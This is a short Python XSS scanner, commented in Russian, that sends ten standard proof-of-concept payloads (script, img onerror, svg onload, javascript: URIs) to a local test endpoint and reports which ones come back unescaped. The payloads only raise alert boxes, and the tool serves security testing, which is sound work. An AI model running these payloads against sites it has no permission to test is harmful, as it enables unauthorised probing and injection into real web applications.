import requests
import os
from datetime import datetime
from markupsafe import escape

# Список полезных нагрузок XSS
xss_payloads = [
    "<script>alert('XSS')</script>",  # Простой скрипт
    "<img src=x onerror=alert('XSS')>",  # XSS с изображением
    "<svg/onload=alert('XSS')>",  # XSS с SVG
    "<iframe src='javascript:alert(`XSS`);'></iframe>",  # XSS через iframe
    "javascript:alert('XSS')",  # Вставка javascript
    "<body onload=alert('XSS')>",  # XSS при загрузке тела страницы
    "'\"><script>alert('XSS')</script>",  # Закрытие тегов
    "><script>alert(1)</script>",  # Некорректные символы
    "<marquee onstart=alert('XSS')>XSS</marquee>",  # XSS через marquee
    "<a href='javascript:alert(1)'>Click</a>"  # XSS через ссылку
]

# URL для тестирования
url = 'http://127.0.0.1:5000/xss'

# Параметры запроса (параметр 'input' используется для передачи полезных нагрузок)
params = {
    'input': ''
}

results = []

def test_xss_vulnerabilities(url, params, payloads):
    """Функция для тестирования уязвимости к XSS"""
    for payload in payloads:
        print(f'Testing payload: {payload}')
        params['input'] = payload

        try:
            response = requests.get(url, params=params)
            is_vulnerable = False

            # Проверка, экранируется ли payload
            if payload in response.text and escape(payload) not in response.text:
                is_vulnerable = True
                print(f'[!] XSS vulnerability detected with payload: {payload}')
            else:
                print(f'[+] No obvious XSS vulnerability detected for payload: {payload}')

            results.append({
                'payload': payload,
                'status_code': response.status_code,
                'is_vulnerable': is_vulnerable,
                'response_snippet': response.text[:200]  # Показать только первые 200 символов ответа
            })
        except requests.RequestException as e:
            print(f'Error during request: {e}')
            results.append({
                'payload': payload,
                'status_code': None,
                'is_vulnerable': False,
                'error': str(e)
            })

def generate_report(results, report_dir='Отчет'):

    """Функция генерации отчета"""
    if not results:
        print('[INFO] Нет данных для анализа.')
        return
    
    os.makedirs(report_dir, exist_ok=True)

    report_filename = 'Уязвимости XSS.txt'
    report_path = os.path.join(report_dir, report_filename)

    # Анализ результатов
    total_tests = len(results)
    vulnerabilities = [r for r in results if r['is_vulnerable']]
    total_vulnerable = len(vulnerabilities)


    try:
        with open(report_path, 'w') as f:
            f.write('XSS Vulnerability Testing Report\n')
            f.write('=' * 40 + '\n')
            f.write(f'Testing Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Total Tests Conducted: {total_tests}\n')
            f.write(f'Total Vulnerabilities Found: {total_vulnerable}\n\n')

            f.write('Detailed Vulnerability Information:\n')
            f.write('-' * 40 + '\n')
            for vuln in vulnerabilities:
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Status Code: {vuln['status_code']}\n")
                f.write(f"Response Snippet: {vuln['response_snippet']}\n")
                f.write('-' * 40 + '\n')

            print(f'[INFO] Report saved to: {report_path}')
    except Exception as e:
        print(f'[ERROR] Error while saving the report: {e}')

if __name__ == '__main__':
    # Запуск тестирования
    test_xss_vulnerabilities(url, params, xss_payloads)

    # Генерация отчета
    generate_report(results)